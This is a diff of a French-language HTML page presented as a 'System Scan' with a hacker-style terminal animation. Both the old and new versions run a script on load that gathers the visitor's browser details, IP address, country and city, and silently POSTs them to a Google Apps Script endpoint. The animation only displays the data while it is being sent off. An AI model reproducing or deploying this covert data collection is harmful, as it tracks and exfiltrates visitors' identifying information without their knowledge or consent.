@@ -2,40 +2,98 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Scan</title>
+<title>System Scan</title>
+
+<style>
+body {
+    background: black;
+    color: #00ff00;
+    font-family: monospace;
+    padding: 20px;
+}
+#terminal {
+    white-space: pre-line;
+    font-size: 15px;
+}
+.blink {
+    animation: blink 1s infinite;
+}
+@keyframes blink {
+    0% {opacity:1;}
+    50% {opacity:0;}
+    100% {opacity:1;}
+}
+</style>
 </head>
+
 <body>
-<h3>Scan en cours…</h3>
+<div id="terminal"></div>
 
 <script>
-async function sendData() {
-  let data = {
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    platform: navigator.platform,
-    screen: screen.width + "x" + screen.height,
-    country: "",
-    city: "",
-    ip: ""
-  };
+const term = document.getElementById("terminal");
 
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    const ipData = await res.json();
-    data.country = ipData.country_name;
-    data.city = ipData.city;
-    data.ip = ipData.ip;
-  } catch(e) {}
-
-  fetch("https://script.google.com/macros/s/AKfycbzBoQBLsSn8O8Uvt8I1Ls2bhwIIX9wrX9CuaMCILODprS00lXHqogkInFZJuS-k9Rum/exec", {
-    method: "POST",
-    body: JSON.stringify(data)
-  });
-
-  document.body.innerHTML = "<h3>Scan terminé ✅</h3>";
+function sleep(ms) {
+    return new Promise(r => setTimeout(r, ms));
 }
 
-sendData();
+async function hackerDemo() {
+    term.innerHTML += "Initializing system...\n";
+    await sleep(800);
+    term.innerHTML += "Connecting to device...\n";
+    await sleep(800);
+    term.innerHTML += "Access granted ✔️\n\n";
+    await sleep(600);
+
+    term.innerHTML += "Scanning device";
+    for (let i = 0; i < 3; i++) {
+        await sleep(400);
+        term.innerHTML += ".";
+    }
+    term.innerHTML += "\n\n";
+
+    let data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: screen.width + "x" + screen.height,
+        date: new Date().toLocaleString(),
+        country: "",
+        city: "",
+        ip: ""
+    };
+
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const ipData = await res.json();
+        data.country = ipData.country_name;
+        data.city = ipData.city;
+        data.ip = ipData.ip;
+    } catch {}
+
+    term.innerHTML += "Collecting data...\n";
+    await sleep(1000);
+
+    fetch("https://script.google.com/macros/s/AKfycbwwGP_gZ_hKNpGQ0be2EVqZuOF1vW-H0Fw5Wv56xGd30C8O3JFbc79BNNyQ-M8Zh6wS/exec", {
+        method: "POST",
+        body: JSON.stringify(data)
+    });
+
+    await sleep(800);
+
+    term.innerHTML += "\n===== SCAN RESULT =====\n";
+    term.innerHTML += "Device      : " + data.platform + "\n";
+    term.innerHTML += "Language    : " + data.language + "\n";
+    term.innerHTML += "Screen      : " + data.screen + "\n";
+    term.innerHTML += "Browser     : " + navigator.userAgent + "\n";
+    term.innerHTML += "Country     : " + data.country + "\n";
+    term.innerHTML += "City        : " + data.city + "\n";
+    term.innerHTML += "IP Address  : " + data.ip + "\n";
+    term.innerHTML += "Date        : " + data.date + "\n\n";
+    term.innerHTML += "Scan complete <span class='blink'>█</span>";
+}
+
+hackerDemo();
 </script>
+
 </body>
 </html>
